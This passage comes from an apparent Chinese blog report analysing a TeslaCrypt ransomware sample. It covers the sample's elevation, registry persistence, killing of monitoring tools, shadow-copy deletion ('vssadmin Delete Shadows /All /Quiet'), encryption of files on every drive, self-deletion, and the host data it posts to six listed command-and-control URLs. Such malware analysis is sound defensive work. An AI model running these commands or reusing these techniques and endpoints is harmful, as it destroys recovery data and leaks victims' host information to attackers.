class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&quot;windir&quot;</span><br><span class="line">&quot;%s\system32\cmd.exe&quot;</span><br><span class="line">&quot;&#x2F;c start &quot;&quot; &quot;&quot;</span><br><span class="line">&quot;runas&quot;</span><br><span class="line">&quot;vssadmin.exe&quot;</span><br><span class="line">&quot;Delete Shadows &#x2F;All &#x2F;Quiet &quot;</span><br><span class="line">&quot;open&quot;</span><br><span class="line">&quot;%s\%s&quot;</span><br><span class="line">&quot;%s\%s.exe&quot;</span><br><span class="line">&quot;SeDebugPrivilege&quot;</span><br><span class="line">&quot;Software\%s&quot;</span><br><span class="line">&quot;data&quot;</span><br><span class="line">&quot;S-1-5-18\&quot;</span><br><span class="line">&quot;S-1-5-18\Software\MSVCC\&quot;</span><br><span class="line">&quot;%X%X%X%X%X%X%X%X&quot;</span><br><span class="line">&quot;Software\MSVCC\&quot;</span><br><span class="line">&quot;FIX&quot;</span><br><span class="line">&quot;\+recover+file.txt&quot;</span><br><span class="line">&quot;%s\n%s\n%S\n%d\n&quot;</span><br><span class="line">&quot;image&#x2F;png&quot;</span><br><span class="line">&quot;Software\Microsoft\Windows\CurrentVersion\Run&quot;</span><br><span class="line">&quot;%s\SYSTEM32\CMD.EXE &#x2F;C START &quot;&quot; &quot;&quot;</span><br><span class="line">&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Policies&quot;</span><br><span class="line">&quot;EnableLinkedConnections&quot;</span><br><span class="line">&quot;taskmg&quot;</span><br><span class="line">&quot;regedi&quot;</span><br><span class="line">&quot;procex&quot;</span><br><span class="line">&quot;msconfi&quot;</span><br><span class="line">&quot;cmd&quot;</span><br><span class="line">&quot;reg add HKEY_CURRENT_USER\Software\Microsoft\Windo&quot;</span><br><span class="line">&quot;.com&quot;</span><br><span class="line">&quot;REcovER&quot;</span><br><span class="line">&quot;%s\+%s+%s+%s&quot;</span><br><span class="line">&quot;.png&quot;</span><br><span class="line">&quot;.txt&quot;</span><br><span class="line">&quot;.html&quot;</span><br><span class="line">&quot;A:\&quot;</span><br><span class="line">&quot;B:\&quot;</span><br><span class="line">&quot;\*.*&quot;</span><br><span class="line">&quot;recove&quot;</span><br></pre></td></tr></table></figure><center>表2</center></li><li><p>解密出的URL和请求包头，如表3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&quot;http:&#x2F;&#x2F;videoaminproduktion.de&#x2F;plugins&#x2F;binstr.php&quot;</span><br><span class="line">&quot;http:&#x2F;&#x2F;clubsaintandre.fr&#x2F;PostsImages&#x2F;binstr.php&quot;</span><br><span class="line">&quot;http:&#x2F;&#x2F;affiliateproductes.com&#x2F;binstr.php&quot;</span><br><span class="line">&quot;http:&#x2F;&#x2F;ptgp.pl&#x2F;tmp&#x2F;binstr.php&quot;</span><br><span class="line">&quot;http:&#x2F;&#x2F;strategicdisaster.info&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;binstr.php&quot;</span><br><span class="line">&quot;http:&#x2F;&#x2F;minteee.com&#x2F;PostsImages&#x2F;binstr.php&quot;</span><br><span class="line">&quot;Sub&#x3D;%s&amp;dh&#x3D;%s&amp;addr&#x3D;%s&amp;size&#x3D;%lld&amp;version&#x3D;4.0&amp;OS&#x3D;%ld&amp;ID&#x3D;%d&amp;inst_id&#x3D;%X%X%X%X%X%X%X%X&quot;</span><br><span class="line">&quot;0324532423723948572379453249857&quot;</span><br><span class="line">&quot;Mozilla&#x2F;5.0 (Windows NT 6.3 rv:11.0) like Gecko&quot;</span><br><span class="line">&quot;Content-Type: application&#x2F;x-www-form-urlencoded&quot;</span><br><span class="line">&quot;*&#x2F;*&quot;</span><br><span class="line">&quot;Crypted&quot;</span><br><span class="line">&quot;Ping&quot;</span><br><span class="line">&quot;data&#x3D;%s&quot;</span><br><span class="line">&quot;POST&quot;</span><br><span class="line">&quot;INSERTED&quot;</span><br></pre></td></tr></table></figure></li></ul><center>表3</center><h3 id="判断进程TOKEN的完整性和样本所在路径"><a href="#判断进程TOKEN的完整性和样本所在路径" class="headerlink" title="判断进程TOKEN的完整性和样本所在路径"></a>判断进程TOKEN的完整性和样本所在路径</h3><p>然后判断当前进程token的完整性，如果当前进程的标签完整性是低的话，便执行下图中的<font color=red>Elevate_privileges_407100</font>，通过执行cmd命令runas，以管理员权限再次运行一次。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567857482710.png" alt="1567857482710"></p><p><font color=red>Elevate_privileges_407100</font>,通过ShellExecuteExw执行，拼接出的指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\cmd.exe &#x2F;c strat xxxxx.exe runas</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567856634938.png" alt="1567856634938"></p><h3 id="创建新进程"><a href="#创建新进程" class="headerlink" title="创建新进程"></a>创建新进程</h3><p>然后再判断文件的路径是否在”我的文档”的目录下，如果不在的话，将自身复制到到”我的文档”目录下更名为随机生产的6位随机字符串，并修改文件属性为隐藏。然后删除源文件，结束当前进程。创建新的进程执行复制出来的新程序。也就是在<font color=red>样本行为分析图1</font>抓取到的行为。</p><p>若在”我的文档”目录下，则继续执行。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567857246991.png" alt="1567857246991"></p><h3 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h3><p>通过函数<font color=red>CreateMutexw</font>创建互斥体9-9-9-9。当互斥体存在时，直接结束。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567858359309.png" alt="1567858359309"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>提升进程权限，提升权限为<font color=red>SeDebugPrivilege</font>。如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567858870374.png" alt="1567858870374"></p><h3 id="创建线程1：监控进程"><a href="#创建线程1：监控进程" class="headerlink" title="创建线程1：监控进程"></a>创建线程1：监控进程</h3><p>创建线程1，线程1主要监控所有进程，时时遍历所有进程，当遇到<font color=red>taskmg;regedi;procex;msconfi;cmd</font>,就立马结束这些进程。如下图：</p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/01_TeslaCrypt勒索病毒分析报告/1567860386887.png" alt="1567860386887"  /><h3 id="创建线程2：删除卷影拷贝"><a href="#创建线程2：删除卷影拷贝" class="headerlink" title="创建线程2：删除卷影拷贝"></a>创建线程2：删除卷影拷贝</h3><p>再创建线程2之前，该样本先获取了当前操作系统的信息，判断操作系统是不是XP，如果不是创建线程删除卷影拷贝，否则反之。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567861126751.png" alt="1567861126751"></p><p>线程2，通过将解密出的指令拼接起来，交由shellexecute执行删除卷影拷贝的命令，防止进行数据恢复。就产生了<font color=red>在样本行为分析中图5</font>抓取到的行为。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruas vssadmin.exe Delete Shadows &#x2F;ALL &#x2F;Quiet</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567861243654.png" alt="1567861243654"></p><h3 id="连续6个函数"><a href="#连续6个函数" class="headerlink" title="连续6个函数"></a>连续6个函数</h3><p>创建完线程2之后，连着一下有了6个函数。这里一个一个分析。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567862335585.png" alt="1567862335585"></p><ul><li><strong>-第一个函数,获取一些特殊的文件路径，如：”刻录路径”；”桌面路径”；”公共桌面路径”。如图：</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567862786033.png" alt="1567862786033"></p><ul><li><strong>第二个函数，往注册表中写入数据。</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567863033929.png" alt="1567863033929"></p><p>先往<font color=red>HKEY_CURRRENT_USER\Software\MSVCC</font>,下写入personID，并名为FIX</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567863463010.png" alt="1567863463010"></p><p>修改后的注册表如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567863653699.png" alt="1567863653699"></p><p>然后往<font color=red>HKEY_CURRRENT_USER\Software&lt;personID&gt;</font>写入data值。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567864412110.png" alt="1567864412110"></p><p>Data中的是3个数据拼接出来的。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567864032521.png" alt="1567864032521"></p><ul><li><strong>第三个函数，修改注册表添加自启动项</strong></li></ul><p>先生成4位的随机数，并拼接成<font color=red>+++xxxx</font>作为键值的名称，然后再与解密出的指令拼接，拼接成<font color=red>c:windows\system32\cmd.exe /c start “c:user&lt;&gt;\document\xxxxx.exe” </font>作为键值。然后添加到<font color=red>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</font>项中。可见行为分析图9所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567929481304.png" alt="1567929481304"></p><p>然后修改<font color=red>software\Microsoft\Windows\CurrentVersion\Polices</font>中的<font color=red>enableLinkedconnections</font>,提升进程访问网络共享的权限。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567929663825.png" alt="1567929663825"></p><ul><li><strong>第四个函数：在我的文档目录下写入加密数据</strong></li></ul><p>将<font color=red>personID和刚写入注册表中的data值中的前两个数值</font>拼接起来，然后再进行加密并写入”我的文档”目录下的<font color=red>+recover+file.txt</font>中。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567936981995.png" alt="1567936981995"></p><p>其中拼接出的数据和写入data中的数据对比图，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567936532441.png" alt="1567936532441"></p><ul><li><strong>第五个函数：完善勒索信息</strong></li></ul><p>先将personID从unicode转换为ascii存储在内存中。然后再将解密出来的勒索信息中的<font color=red>xxxxxxx替换成personID</font>。然后存储到<font color=red>chText</font>中，后面会用到该完整的勒索信息。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567937432442.png" alt="1567937432442"></p><p>将personID填入解密出的文本后，构成的完整的勒索信息如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567937891729.png" alt="1567937891729"></p><ul><li><strong>第六个函数：初始化勒索信息图片</strong></li></ul><p>通过调用GdiplusStartup来初始化GDI。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567939547103.png" alt="1567939547103"></p><p>然后调用DrawTextA，将第5个函数获取到的完整勒索信息chtext_completion_ransome_info画出来。也就是最终勒索弹出的图片。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567939663047.png" alt="1567939663047"></p><p>也就是最终勒索弹出的图片,如图:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567940044615.png" alt="1567940044615"></p><h3 id="创建线程3：发送加密数据"><a href="#创建线程3：发送加密数据" class="headerlink" title="创建线程3：发送加密数据"></a>创建线程3：发送加密数据</h3><p>线程3，向解密出来的URL发送data中的数据等加密后的主机信息。</p><p>首先拼接data中第二段的值、personID、1105和网络请求相关字符串。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567940968494.png" alt="1567940968494"></p><p>然后将拼接出的信息进行加密。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567941217461.png" alt="1567941217461"></p><p>然后将加密过的数据发送给之前解密出来的恶意URL（表3）。<font color=red>可见行为分析图8所示</font>。</p><table><thead><tr><th>恶意URL</th></tr></thead><tbody><tr><td>“<a href="http://strategicdisaster.info/wordpress/wp-content/plugins/binstr.php&quot;">http://strategicdisaster.info/wordpress/wp-content/plugins/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://videoaminproduktion.de/plugins/binstr.php&quot;">http://videoaminproduktion.de/plugins/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://clubsaintandre.fr/PostsImages/binstr.php&quot;">http://clubsaintandre.fr/PostsImages/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://affiliateproductes.com/binstr.php&quot;">http://affiliateproductes.com/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://ptgp.pl/tmp/binstr.php&quot;">http://ptgp.pl/tmp/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://minteee.com/PostsImages/binstr.php&quot;">http://minteee.com/PostsImages/binstr.php&quot;</a></td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567941375056.png" alt="1567941375056"></p><h3 id="创建线程4：对文件进行加密"><a href="#创建线程4：对文件进行加密" class="headerlink" title="创建线程4：对文件进行加密"></a>创建线程4：对文件进行加密</h3><p>先获取系统文件路径，并通过<font color=red>GetLogicalDriveStringsw</font>函数获取当前所有盘符。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567944855107.png" alt="1567944855107"></p><p>然后遍历所有盘符，并判断当前遍历到的盘符类型。</p><p>如果盘符类型如下表时，执行file_encode_401920对该盘符进行加密</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567945236934.png" alt="1567945236934"></p><p>遍历文件，然后判断文件时目录还是文件，如果是目录则进行判断，若是<font color=red>c:\windows；c:\program files和program data</font>这三个目录，便不在进行遍历（排除这3个目录）。然后进行递归，直到遍历到文件。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567950619428.png" alt="1567950619428"></p><p>若是文件，便进行<font color=red>判断该文件后缀</font>是否在要加密的后缀名表中。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567950908230.png" alt="1567950908230"></p><p>加密文件，先查看文件属性，若文件属性为只读属性，则<font color=red>修改文件属性</font>。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567994495176.png" alt="1567994495176"></p><p>然后<font color=red>读取加密文件到buff中</font>。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567994555550.png" alt="1567994555550"></p><p>然后将读取到的数据进行加密，然后进行了三次写入。第一次写入data中的数据，然后写入一个1591986926的数据，最后再将加密后的数据写入文件中，文件加密完成。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567994695463.png" alt="1567994695463"></p><h3 id="设置线程优先级并等待"><a href="#设置线程优先级并等待" class="headerlink" title="设置线程优先级并等待"></a>设置线程优先级并等待</h3><p>将线程4（文件加密）的优先级设置为最低，然后等待线程4运行完，然后再执行下一步弹窗显示勒索信息。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567995004864.png" alt="1567995004864"></p><h3 id="弹窗显示勒索图片和文件"><a href="#弹窗显示勒索图片和文件" class="headerlink" title="弹窗显示勒索图片和文件"></a>弹窗显示勒索图片和文件</h3><p>先将前面分析的连续6个函数中的第六个函数中的初始化的勒索图片保存再本地。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567995246630.png" alt="1567995246630"></p><p>再通过open_file_410C30函数调用<font color=red>shellExecutew</font>执行如下命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open c:\users\john\Desktop\+recover+oujgv.png</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567995351949.png" alt="1567995351949"></p><p>来弹出勒索信息的图片。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567940044615.png" alt="1567940044615"></p><p>先拼接出桌面勒索文件的绝对路径，然后将连续6个函数中的第5个函数中获得的完整勒索信息<font color=red>chText_completion_ransome_info</font>，写入桌面的勒索文本中。然后再调用open_file_410C30将文本打开。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567995515350.png" alt="1567995515350"></p><p>通过shellExecutew执行命令，打开刚写入的文件文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open c:\users\john\Desktop\+recover+oujgv.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567995793089.png" alt="1567995793089"></p><h3 id="再次创建线程2和线程3并删除自身"><a href="#再次创建线程2和线程3并删除自身" class="headerlink" title="再次创建线程2和线程3并删除自身"></a>再次创建线程2和线程3并删除自身</h3><p>弹窗显示完勒索图片和文本后，再次创建线程2，删除卷影拷贝，防止恢复到加密前。再次创建线程3，再次发送主机信息到远程服务器。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567996401574.png" alt="1567996401574"></p><p>当线程3运行完之后，执行cmd_del_file_410990调用cmd执行如下命令，删除自身。<font color=red>可见行为分析图7所示</font>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x2F;c DEL C:\Users john\DOCUMENT\Vohdrw.exe&gt;&gt;NUL</span><br></pre></td></tr></table></figure><p><img 